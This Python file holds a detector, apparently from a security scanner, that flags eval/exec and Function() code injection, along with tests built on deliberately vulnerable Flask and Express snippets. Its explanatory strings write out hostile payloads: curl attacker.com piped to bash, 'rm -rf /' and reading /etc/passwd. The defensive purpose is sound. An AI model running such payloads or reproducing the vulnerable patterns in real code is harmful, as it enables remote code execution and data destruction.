"""
Test suite for detecting code injection vulnerabilities (eval, exec, etc.).
NEW DETECTOR - Added based on OpenAI analysis recommendations.
"""
import re
from typing import Dict
import sys
from pathlib import Path

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


class CodeInjectionDetector:
    """Detects code injection vulnerabilities via eval(), exec(), etc."""

    def __init__(self):
        self.vulnerabilities = []
        self.score = 0

    def analyze(self, code: str, language: str = "python") -> Dict:
        """Analyze code for code injection vulnerabilities."""
        self.vulnerabilities = []
        self.score = 2

        if language == "python":
            return self._analyze_python(code)
        elif language == "javascript":
            return self._analyze_javascript(code)
        else:
            return {"score": 0, "vulnerabilities": ["Unsupported language"], "max_score": 2}

    def _analyze_python(self, code: str) -> Dict:
        """Analyze Python code for eval/exec injection."""

        # Pattern 1: eval() with user input
        eval_patterns = [
            r'\beval\s*\(',
            r'\bexec\s*\(',
            r'\bcompile\s*\(',
            r'__import__\s*\(',
        ]

        for pattern in eval_patterns:
            locations = find_pattern_locations(code, pattern)
            if locations:
                # Check if eval/exec uses user input
                has_user_input = any([
                    re.search(r'(eval|exec|compile)\([^)]*request\.', code),
                    re.search(r'(eval|exec|compile)\([^)]*input\(', code),
                    re.search(r'(eval|exec|compile)\([^)]*sys\.argv', code),
                    re.search(r'(eval|exec|compile)\([^)]*\.get\(', code),  # request.args.get(), etc.
                ])

                # Check if any variable from user input is passed to eval/exec
                has_eval_var = re.search(r'(eval|exec|compile)\([^)]*\w+', code)
                has_user_var = re.search(r'(\w+)\s*=\s*(request\.(args|form|json|query|values|GET|POST|data)\.get\(|sys\.argv|input\()', code)

                if has_user_input or (has_eval_var and has_user_var):
                    location = locations[0]
                    self.vulnerabilities.append({
                        "type": "CODE_INJECTION",
                        "severity": "CRITICAL",
                        "description": "eval()/exec() with user input - REMOTE CODE EXECUTION RISK: Attacker can execute arbitrary Python code on server. ATTACK: User sends malicious code → eval() executes it → Complete server compromise. EXAMPLES: (1) eval(request.args.get('expr')) + input '__import__(\"os\").system(\"rm -rf /\")' → Deletes all files, (2) exec(user_code) + input 'import socket; send credentials to attacker', (3) compile() + malicious bytecode → Backdoor installation. IMPACT: Full server takeover, data exfiltration, malware installation, denial of service. This is one of the most severe vulnerabilities possible.",
                        "recommendation": "NEVER use eval()/exec()/compile() with user input. ALTERNATIVES: (1) Use ast.literal_eval() for safe evaluation of literals only (numbers, strings, lists, dicts), (2) Use a sandboxed expression evaluator (RestrictedPython, PyParsing), (3) Redesign to avoid dynamic code execution - use data structures instead of code, (4) If absolutely necessary, use strict input validation with allowlist of safe operations only.",
                        "example_attack": "Scenario: eval(request.args.get('calc')) with URL: /calc?calc=__import__('os').system('curl attacker.com/malware.sh|bash') → Downloads and executes malware, compromises entire server, steals database credentials, installs backdoor.",
                        "line_number": location['line_number'],
                        "code_snippet": location['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "eval(), exec(), or compile() function called",
                                "User input passed directly or via variable",
                                "No sandboxing or input validation present",
                                "Arbitrary code execution possible"
                            ],
                            "why_vulnerable": [
                                f"Line {location['line_number']}: eval()/exec() accepts user-controlled input",
                                "User can send any Python code as input",
                                "eval() executes code with full interpreter privileges",
                                "Can import os, sys, subprocess for system commands",
                                "Can read files, exfiltrate data, install backdoors, delete files"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "eval() function calls",
                                "exec() function calls",
                                "compile() function calls",
                                "__import__() usage",
                                "User input sources (request.*, input(), sys.argv)",
                                "ast.literal_eval() safe alternative"
                            ],
                            "evidence": {
                                "found_patterns": ["eval()/exec() with user input - RCE"],
                                "line_numbers": [location['line_number']],
                                "code_snippets": [location['line_content']]
                            }
                        }
                    })
                    self.score = 0
                    break

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_javascript(self, code: str) -> Dict:
        """Analyze JavaScript code for eval/Function injection."""

        # Pattern 1: eval() with user input
        eval_locations = find_pattern_locations(code, r'\beval\s*\(')

        if eval_locations:
            # Check if eval uses user input
            has_user_input = any([
                re.search(r'eval\([^)]*req\.(body|query|params)', code),
                re.search(r'eval\([^)]*request\.', code),
                re.search(r'eval\([^)]*process\.argv', code),
            ])

            # Check if variable from user input is passed to eval
            has_eval_var = re.search(r'eval\([^)]*\w+', code)
            has_user_var = re.search(r'(\w+)\s*=\s*req\.(body|query|params)', code)

            if has_user_input or (has_eval_var and has_user_var):
                location = eval_locations[0]
                self.vulnerabilities.append({
                    "type": "CODE_INJECTION",
                    "severity": "CRITICAL",
                    "description": "eval() with user input - REMOTE CODE EXECUTION RISK: Attacker can execute arbitrary JavaScript code on server. ATTACK: User sends malicious code → eval() executes it → Complete server compromise. EXAMPLES: (1) eval(req.query.code) + input 'require(\"child_process\").exec(\"rm -rf /\")' → Deletes all files, (2) eval(userCode) + input 'require(\"fs\").readFileSync(\"/etc/passwd\")' → Read sensitive files, (3) Process exit, database corruption, credential theft. IMPACT: Full server takeover, data exfiltration, denial of service, backdoor installation.",
                    "recommendation": "NEVER use eval() with user input. ALTERNATIVES: (1) Use JSON.parse() for parsing JSON data (not code), (2) Use safe expression evaluators (math.js with safe mode, expr-eval), (3) Redesign to avoid dynamic code execution, (4) Use vm2 module for sandboxed execution (still risky). If you need to evaluate math expressions, use a dedicated math parser, not eval().",
                    "example_attack": "Scenario: eval(req.query.expr) with URL: /calc?expr=require('child_process').exec('curl attacker.com|bash') → Downloads and executes malware, compromises Node.js server, steals environment variables (API keys, DB passwords).",
                    "line_number": location['line_number'],
                    "code_snippet": location['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "eval() function called in JavaScript",
                            "User input from req.query/req.body/req.params",
                            "No sandboxing or input validation",
                            "Arbitrary JavaScript code execution possible"
                        ],
                        "why_vulnerable": [
                            f"Line {location['line_number']}: eval() accepts user-controlled input",
                            "User can send any JavaScript code in request",
                            "eval() executes with full Node.js privileges",
                            "Can require() modules like child_process, fs for system access",
                            "Can execute shell commands, read files, access environment variables"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "eval() function calls",
                            "User input sources (req.query, req.body, req.params, process.argv)",
                            "Function() constructor usage",
                            "JSON.parse() safe alternative",
                            "Safe expression evaluators"
                        ],
                        "evidence": {
                            "found_patterns": ["eval() with user input - RCE"],
                            "line_numbers": [location['line_number']],
                            "code_snippets": [location['line_content']]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: Function() constructor with user input
        function_locations = find_pattern_locations(code, r'new\s+Function\s*\(')

        if function_locations and self.score == 2:
            has_user_input = any([
                re.search(r'Function\([^)]*req\.(body|query|params)', code),
                re.search(r'Function\([^)]*request\.', code),
            ])

            has_function_var = re.search(r'Function\([^)]*\w+', code)
            has_user_var = re.search(r'(\w+)\s*=\s*req\.(body|query|params)', code)

            if has_user_input or (has_function_var and has_user_var):
                location = function_locations[0]
                self.vulnerabilities.append({
                    "type": "CODE_INJECTION",
                    "severity": "CRITICAL",
                    "description": "Function() constructor with user input - REMOTE CODE EXECUTION: Similar to eval(), allows arbitrary code execution. ATTACK: new Function(userCode)() → Executes attacker's JavaScript on server. IMPACT: Complete server compromise.",
                    "recommendation": "NEVER use Function() constructor with user input. Use same alternatives as eval() - avoid dynamic code execution entirely.",
                    "line_number": location['line_number'],
                    "code_snippet": location['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "new Function() constructor called",
                            "User input passed as function body or parameter",
                            "No input validation or sandboxing",
                            "Equivalent to eval() - arbitrary code execution"
                        ],
                        "why_vulnerable": [
                            f"Line {location['line_number']}: Function() constructor with user input",
                            "new Function(userCode) creates function from string",
                            "Executing function runs attacker's code",
                            "Same privileges as eval() - full system access",
                            "Can require modules, execute commands, read files"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "new Function() constructor calls",
                            "User input sources (req.*, process.argv)",
                            "eval() alternatives",
                            "Safe function patterns"
                        ],
                        "evidence": {
                            "found_patterns": ["Function() constructor with user input - RCE"],
                            "line_numbers": [location['line_number']],
                            "code_snippets": [location['line_content']]
                        }
                    }
                })
                self.score = 0

        # Pattern 3: setTimeout/setInterval with string argument (less severe but still risky)
        # Check for template literals with user input
        has_template_literal = re.search(r'(setTimeout|setInterval)\s*\(\s*`[^`]*\$\{', code)

        if has_template_literal and self.score > 0:
            timeout_locations = find_pattern_locations(code, r'(setTimeout|setInterval)\s*\(\s*`')
            if timeout_locations:
                location = timeout_locations[0]
                self.vulnerabilities.append({
                    "type": "CODE_INJECTION",
                    "severity": "HIGH",
                    "description": "setTimeout/setInterval with dynamic string - CODE INJECTION RISK: Passing strings to setTimeout is like eval(). If string includes user input, attacker can inject code. SAFER: Pass function reference instead of string.",
                    "recommendation": "Use function reference instead of string: setTimeout(() => doSomething(), 1000) instead of setTimeout('doSomething()', 1000). Never use template literals with user input in setTimeout/setInterval strings.",
                    "line_number": location['line_number'],
                    "code_snippet": location['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "setTimeout() or setInterval() with string argument",
                            "Template literal used in string construction",
                            "String is evaluated as code when timer fires",
                            "Less severe than eval() but still dangerous"
                        ],
                        "why_vulnerable": [
                            f"Line {location['line_number']}: setTimeout/setInterval with template literal",
                            "Passing string to setTimeout evaluates as code",
                            "Template literal may include user input",
                            "When timer fires, string is evaluated like eval()",
                            "Can inject malicious JavaScript code"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "setTimeout() with string argument",
                            "setInterval() with string argument",
                            "Template literals in timer functions",
                            "Function reference patterns (safer)"
                        ],
                        "evidence": {
                            "found_patterns": ["setTimeout/setInterval with template literal string"],
                            "line_numbers": [location['line_number']],
                            "code_snippets": [location['line_content']]
                        }
                    }
                })
                self.score = 1

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_python_eval_user_input():
    """Test detection of eval() with user input."""
    vulnerable_code = '''
from flask import Flask, request

app = Flask(__name__)

@app.route('/calc')
def calculate():
    expression = request.args.get('expr')
    result = eval(expression)
    return str(result)
'''
    detector = CodeInjectionDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect eval() with user input"
    assert any(v["type"] == "CODE_INJECTION" for v in result["vulnerabilities"])
    assert any(v["severity"] == "CRITICAL" for v in result["vulnerabilities"])


def test_python_exec_user_input():
    """Test detection of exec() with user input."""
    vulnerable_code = '''
import sys

user_code = sys.argv[1]
exec(user_code)
'''
    detector = CodeInjectionDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect exec() with user input"


def test_javascript_eval_user_input():
    """Test detection of eval() in JavaScript."""
    vulnerable_code = '''
app.get('/calc', (req, res) => {
    const expression = req.query.expr;
    const result = eval(expression);
    res.send(result.toString());
});
'''
    detector = CodeInjectionDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] == 0, "Should detect eval() with user input"
    assert any(v["type"] == "CODE_INJECTION" for v in result["vulnerabilities"])


def test_javascript_function_constructor():
    """Test detection of Function() constructor."""
    vulnerable_code = '''
app.post('/run', (req, res) => {
    const code = req.body.code;
    const fn = new Function(code);
    const result = fn();
    res.json({ result });
});
'''
    detector = CodeInjectionDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] == 0, "Should detect Function() constructor with user input"


def test_javascript_settimeout_string():
    """Test detection of setTimeout with dynamic string."""
    vulnerable_code = '''
app.get('/delay', (req, res) => {
    const action = req.query.action;
    setTimeout(`console.log('${action}')`, 1000);
});
'''
    detector = CodeInjectionDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] <= 1, "Should detect setTimeout with template literal"


if __name__ == "__main__":
    test_python_eval_user_input()
    test_python_exec_user_input()
    test_javascript_eval_user_input()
    test_javascript_function_constructor()
    test_javascript_settimeout_string()
    print("All code injection detection tests passed!")
